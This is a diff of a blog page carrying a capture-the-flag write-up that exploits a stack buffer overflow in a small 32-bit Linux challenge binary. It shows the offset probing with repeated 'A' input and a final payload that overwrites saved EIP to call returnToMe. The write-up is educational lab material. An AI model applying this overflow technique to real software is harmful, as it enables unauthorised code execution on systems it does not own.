@@ -34,20 +34,17 @@
                   <a href="/2014/buf0-challenge.html">&lt&lt;</a> published on 24/Feb/2014<a href="/2014/shellcode-pipeline.html"> &gt;&gt;</i></a><br/>
                 </p>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               <div class="post-content">
-          <p>The binary can be obtained from here: <a href="/static/files/buf1.bin">buf1</a>. Let&#8217;s see
-what <code>file</code> command has to tell us about this challenge file:</p>
-
-<div class="codehilite"><pre><span></span><code>$ file buf1.bin
-buf1.bin: ELF <span class="m">32</span>-bit LSB executable, Intel <span class="m">80386</span>, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.24, BuildID<span class="o">[</span>sha1<span class="o">]=</span>0x746bc251bceb3d50b635362140ec851bf6f85317, not stripped
-</code></pre></div>
+          <pre><code>$ file buf1.bin
+buf1.bin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x746bc251bceb3d50b635362140ec851bf6f85317, not stripped
+</code></pre>
 
 <p>So this binary, like it&#8217;s <a href="/2014/buf0-challenge.html">counterpart</a>, is
 also an x86 ELF with symbols included. Let&#8217;s run <code>strings</code> as well over
 this file:</p>
 
-<div class="codehilite"><pre><span></span><code>$ strings buf1.bin
+<pre><code>$ strings buf1.bin
 /lib/ld-linux.so.2
-<span class="nv">ktP</span><span class="o">=</span>
+ktP=
 __gmon_start__
 libc.so.6
 _IO_stdin_used
@@ -57,10 +54,10 @@ __libc_start_main
 GLIBC_2.0
 PTRh
 UWVS
-<span class="o">[</span>^_<span class="o">]</span>
+[^_]
 W00T!
-<span class="p">;</span>*2$<span class="s2">&quot;</span>
-</code></pre></div>
+;*2$"
+</code></pre>
 
 <p>There&#8217;s the <code>gets</code> syscall and the <code>W00T!</code> string which confirm that
 this indeed is very similar to the previous challenge. Before we execute
@@ -77,28 +74,28 @@ function and see what is it doing:</p>
 <p>Let&#8217;s figure out the size of the buffer to know how many bytes would be
 needed to reach saved EIP:</p>
 
-<div class="codehilite"><pre><span></span><code>$ python -c <span class="s1">&#39;print &quot;A&quot;*40&#39;</span> <span class="p">|</span> ./buf1.bin
-$ python -c <span class="s1">&#39;print &quot;A&quot;*50&#39;</span> <span class="p">|</span> ./buf1.bin
-$ python -c <span class="s1">&#39;print &quot;A&quot;*60&#39;</span> <span class="p">|</span> ./buf1.bin
-$ python -c <span class="s1">&#39;print &quot;A&quot;*70&#39;</span> <span class="p">|</span> ./buf1.bin
-Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+<pre><code>$ python -c 'print "A"*40' | ./buf1.bin
+$ python -c 'print "A"*50' | ./buf1.bin
+$ python -c 'print "A"*60' | ./buf1.bin
+$ python -c 'print "A"*70' | ./buf1.bin
+Segmentation fault (core dumped)
 $
-$ python -c <span class="s1">&#39;print &quot;A&quot;*65&#39;</span> <span class="p">|</span> ./buf1.bin
-$ python -c <span class="s1">&#39;print &quot;A&quot;*66&#39;</span> <span class="p">|</span> ./buf1.bin
-Illegal instruction <span class="o">(</span>core dumped<span class="o">)</span>
+$ python -c 'print "A"*65' | ./buf1.bin
+$ python -c 'print "A"*66' | ./buf1.bin
+Illegal instruction (core dumped)
 $
-$ python -c <span class="s1">&#39;print &quot;A&quot;*67&#39;</span> <span class="p">|</span> ./buf1.bin
-Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
-</code></pre></div>
+$ python -c 'print "A"*67' | ./buf1.bin
+Segmentation fault (core dumped)
+</code></pre>
 
 <p>So, the binary accepts max 66B before <code>gets</code> overwrites saved EIP. Now
 we can inject the buffer with dummy input followed by the address of
 <code>returnToMe</code> function:</p>
 
-<div class="codehilite"><pre><span></span><code>$ python -c <span class="s1">&#39;print &quot;A&quot;*66 + &quot;\x04\x84\x04\x08&quot;&#39;</span> <span class="p">|</span> ./buf1.bin
+<pre><code>$ python -c 'print "A"*66 + "\x04\x84\x04\x08"' | ./buf1.bin
 W00T!
-Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
-</code></pre></div>
+Segmentation fault (core dumped)
+</code></pre>
 
 <p>Done. But this time the program didn&#8217;t exit cleanly. However, the
 challenge was to get the <code>returnToMe</code> function called and it was done
